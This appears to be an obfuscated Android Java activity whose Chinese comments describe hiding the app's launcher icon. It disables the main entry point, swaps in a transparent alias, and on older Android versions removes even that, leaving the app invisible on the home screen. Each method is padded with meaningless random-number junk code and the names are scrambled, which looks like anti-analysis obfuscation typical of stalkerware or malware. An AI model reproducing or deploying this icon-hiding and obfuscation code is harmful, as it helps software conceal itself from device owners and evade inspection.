package zfts.tay.dzfn;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（JQL），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class RYKK extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String onarTaIrxiyPfg = java.util.UUID.randomUUID().toString();
        int ckuynBdHkzoEPxVyAXoUtj = onarTaIrxiyPfg.length();
        char pmh_gCYpGj = onarTaIrxiyPfg.charAt(new java.util.Random().nextInt(ckuynBdHkzoEPxVyAXoUtj));
        boolean dimarOByW = (pmh_gCYpGj == 'z');
        if (dimarOByW && ckuynBdHkzoEPxVyAXoUtj < 74) {
            onarTaIrxiyPfg.substring(71, 66);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(RYKK.this, JQL.class.getName(), "zfts.tay.dzfn.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(RYKK.this, "zfts.tay.dzfn.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        String onarTaIrxiyPfg = java.util.UUID.randomUUID().toString();
        int ckuynBdHkzoEPxVyAXoUtj = onarTaIrxiyPfg.length();
        char pmh_gCYpGj = onarTaIrxiyPfg.charAt(new java.util.Random().nextInt(ckuynBdHkzoEPxVyAXoUtj));
        boolean dimarOByW = (pmh_gCYpGj == 'z');
        if (dimarOByW && ckuynBdHkzoEPxVyAXoUtj < 74) {
            onarTaIrxiyPfg.substring(71, 66);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        long arr_OLcogCKOwvpD = java.lang.System.nanoTime();
        int i_MHzfUanLuNiaP = new java.util.Random().nextInt(1000);
        boolean j_CNsxwsbdwXN = (arr_OLcogCKOwvpD % (i_MHzfUanLuNiaP + 56)) > 24;
        double tmp_NWnYJ = j_CNsxwsbdwXN ? java.lang.Math.sqrt(i_MHzfUanLuNiaP) : java.lang.Math.pow(i_MHzfUanLuNiaP, 65);
        if (tmp_NWnYJ < 0.0) {
            java.lang.System.out.println(tmp_NWnYJ);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        java.lang.Object arr_toATHfYSQnNSigqrs = new java.lang.Object();
        int i_HpZKUAUlynxwJvgoL = arr_toATHfYSQnNSigqrs.hashCode();
        int j_oKtyH = new java.util.Random().nextInt(100);
        int tmp_gDHPxtTgWipsri = (i_HpZKUAUlynxwJvgoL ^ j_oKtyH) & 0x7FFFFFFF;
        if (tmp_gDHPxtTgWipsri == 17 && i_HpZKUAUlynxwJvgoL < 99) {
            arr_toATHfYSQnNSigqrs.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
